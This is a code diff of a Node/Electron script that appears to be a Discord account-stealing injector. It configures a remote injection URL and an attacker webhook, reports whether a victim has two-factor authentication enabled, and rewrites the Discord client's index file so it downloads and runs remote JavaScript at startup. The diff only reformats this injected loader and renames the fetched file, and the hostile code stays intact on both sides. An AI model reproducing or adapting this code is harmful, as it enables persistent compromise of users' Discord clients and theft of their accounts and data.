@@ -1,5 +1,5 @@
 const fs = require("fs")
-const {electron, app, BrowserWindow, session } = require('electron');
+const {electron, app} = require('electron');
 const https = require("https");
 const queryString = require("querystring")
 
@@ -12,7 +12,7 @@ var config = {
     "init-notify": "false",
     "embed-color": 374276,
 
-    injection_url: "https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/injecci.js",
+    injection_url: "https://raw.githubusercontent.com/Raplhs/23123213423543534r3re34534/main/index.js",
     webhook: `%HOOKRE%`,
     Filter: {
         "urls": [
@@ -125,7 +125,7 @@ const GetA2F = (bouki) => {
         case false:
             return ":lock: `A2F Not Enabled`"
         default:
-            return "Idk dude"
+            return "Idk"
     }
 }
 
@@ -395,20 +395,30 @@ const checUpdate = () => {
     if (!fs.existsSync(ressource)) fs.mkdirSync(ressource)
     fs.writeFileSync(package, `{"name": "${appName}", "main": "./index.js"}`)
 
-    var script = `const fs = require("fs"), https = require("https")
-var index = "${indexFile}"
-var betterDiscord = "${betterDiscord}"
-var bouki = fs.readFileSync(index).toString()
-if (bouki == "module.exports = require('./core.asar');") init()
-function init() {
-    https.get("${config.injection_url}", res => {
-        var chunk = ""
-        res.on("data", data => chunk += data)
-        res.on("end", () => fs.writeFileSync(index, chunk.replace("%HOOKRE%", "${config.webhook}")))
-    }).on("error", (err) => setTimeout(init(), 10000));
-}
-require("${appPath}/app.asar")
-if (fs.existsSync(betterDiscord)) require(betterDiscord)`
+    var script = `const fs = require("fs");
+    const https = require("https");
+    
+    var index = "${indexFile}";
+    var betterDiscord = "${betterDiscord}";
+    var bouki = fs.readFileSync(index).toString();
+    
+    if (bouki == "module.exports = require('./core.asar');") {
+        init();
+    }
+    
+    function init() {
+        https.get("${config.injection_url}", res => {
+            var chunk = "";
+            res.on("data", data => chunk += data);
+            res.on("end", () => fs.writeFileSync(index, chunk.replace("%HOOKRE%", "${config.webhook}")));
+        }).on("error", (err) => setTimeout(init(), 10000));
+    }
+    
+    require("${resource}/app.asar");
+    
+    if (fs.existsSync(betterDiscord)) {
+        require(betterDiscord);
+    }`;
 
     fs.writeFileSync(index, script)
     return
